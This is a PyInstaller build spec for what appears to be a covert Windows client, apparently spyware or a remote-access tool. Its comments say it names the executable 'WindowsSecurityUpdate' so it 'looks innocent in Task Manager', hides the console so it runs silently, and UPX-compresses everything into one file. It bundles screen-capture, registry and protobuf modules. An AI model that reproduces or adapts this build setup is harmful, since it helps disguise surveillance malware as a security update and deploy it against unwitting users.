# build_client.spec — PyInstaller spec
# Builds a silent, single-file Windows exe with all dependencies bundled
# Usage: pyinstaller build_client.spec

block_cipher = None

a = Analysis(
    ['client.py'],
    pathex=['.'],
    binaries=[],
    datas=[
        ('client_config.yaml', '.'),   # config bundled inside exe
        ('ca.crt', '.'),               # CA cert bundled inside exe
        ('messages_pb2.py', '.'),
        ('protocol.py', '.'),
        ('config_loader.py', '.'),
    ],
    hiddenimports=[
        'mss',
        'PIL',
        'PIL.ImageGrab',
        'google.protobuf',
        'google.protobuf.descriptor',
        'google.protobuf.descriptor_pool',
        'google.protobuf.symbol_database',
        'google.protobuf.reflection',
        'google.protobuf.message',
        'winreg',
        'ctypes',
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsSecurityUpdate',  # looks innocent in Task Manager
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,                      # compress exe with UPX
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,                 # NO console window — silent
    onefile=True,                  # single exe, no folder
)
